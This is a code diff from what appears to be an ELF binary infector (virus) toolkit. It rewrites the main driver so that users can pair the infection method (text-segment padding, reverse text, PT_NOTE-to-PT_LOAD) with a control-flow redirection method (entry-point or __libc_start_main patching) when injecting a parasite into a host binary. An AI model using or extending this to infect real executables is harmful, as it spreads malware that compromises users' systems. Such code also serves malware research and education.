@@ -11,27 +11,60 @@ const char* TEXT_PADDING = "text_padding";
 const char* REVERSE_TEXT = "reverse_text";
 const char* PT_NOTE_TO_LOAD = "pt_note";
 
-// Usage %s <host> <parasite> <infection method>
+const char* ENTRY_POINT = "entry_point";
+const char* LIBC_MAIN_START = "libc_main_start";
+
+// Usage %s <host> <parasite> <infection method> <redirection method>
 int main(int argc, char** argv) {
-  if (argc != 4) {
+  if (argc != 5) {
+    vt::printf(
+        "Not enough arguments. Usage: <host> <parasite> <infection method> "
+        "<redirection method>\n");
     return EXIT_FAILURE;
   }
 
-  auto method = argv[3];
+  vt::common::String infect(argv[3]);
+  vt::common::String redirect(argv[4]);
   bool ret = false;
 
-  if (vt::common::String(method) == TEXT_PADDING) {
-    ret = vt::infector::infect<vt::infector::PaddingInfector,
-                               vt::redirection::EntryPointPatcher>(argv[1],
-                                                                   argv[2], 44);
-  } else if (vt::common::String(method) == REVERSE_TEXT) {
-    ret = vt::infector::infect<vt::infector::ReverseTextInfector,
-                               vt::redirection::EntryPointPatcher>(argv[1],
-                                                                   argv[2], 44);
-  } else if (vt::common::String(method) == PT_NOTE_TO_LOAD) {
-    ret = vt::infector::infect<vt::infector::PtNoteInfector,
-                               vt::redirection::LibcStartMainPatcher>(
-        argv[1], argv[2], 44);
+  if (infect == TEXT_PADDING) {
+    if (redirect == ENTRY_POINT) {
+      ret = vt::infector::infect<vt::infector::PaddingInfector,
+                                 vt::redirection::EntryPointPatcher>(
+          argv[1], argv[2], 44);
+    } else if (redirect == LIBC_MAIN_START) {
+      ret = vt::infector::infect<vt::infector::PaddingInfector,
+                                 vt::redirection::LibcStartMainPatcher>(
+          argv[1], argv[2], 44);
+    } else {
+      vt::printf("Unsupported redirection: %s\n", redirect.c_str());
+    }
+  } else if (infect == REVERSE_TEXT) {
+    if (redirect == ENTRY_POINT) {
+      ret = vt::infector::infect<vt::infector::ReverseTextInfector,
+                                 vt::redirection::EntryPointPatcher>(
+          argv[1], argv[2], 44);
+    } else if (redirect == LIBC_MAIN_START) {
+      ret = vt::infector::infect<vt::infector::ReverseTextInfector,
+                                 vt::redirection::LibcStartMainPatcher>(
+          argv[1], argv[2], 44);
+    } else {
+      vt::printf("Unsupported redirection: %s\n", redirect.c_str());
+    }
+  } else if (infect == PT_NOTE_TO_LOAD) {
+    if (redirect == ENTRY_POINT) {
+      ret = vt::infector::infect<vt::infector::PtNoteInfector,
+                                 vt::redirection::EntryPointPatcher>(
+          argv[1], argv[2], 44);
+    } else if (redirect == LIBC_MAIN_START) {
+      ret = vt::infector::infect<vt::infector::PtNoteInfector,
+                                 vt::redirection::LibcStartMainPatcher>(
+          argv[1], argv[2], 44);
+    } else {
+      vt::printf("Unsupported redirection: %s\n", redirect.c_str());
+    }
+  } else {
+    vt::printf("Unsupported infection: %s\n", infect.c_str());
   }
 
   return ret ? EXIT_SUCCESS : EXIT_FAILURE;
